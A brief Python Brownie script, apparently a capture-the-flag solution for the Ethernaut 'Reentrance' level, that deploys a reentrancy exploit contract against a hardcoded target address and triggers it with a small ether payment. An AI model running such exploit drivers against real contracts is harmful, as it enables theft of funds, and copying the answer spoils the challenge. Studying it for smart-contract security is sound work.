from brownie import Reentrance, ReentranceExploit, config,accounts

#input the contract address
#> contract.address
contractAddress = '0xD181D589a039Df73703F3a20D87c1dd86e5914B4'
player = accounts.add(config["wallets"]["from_key"])

def solution():
    target = Reentrance.at(contractAddress)
    exploit = ReentranceExploit.deploy(target.address,{"from":player})
    exploit.exploit({"from":player,"value":1000000000000000})

def main():
    solution()
    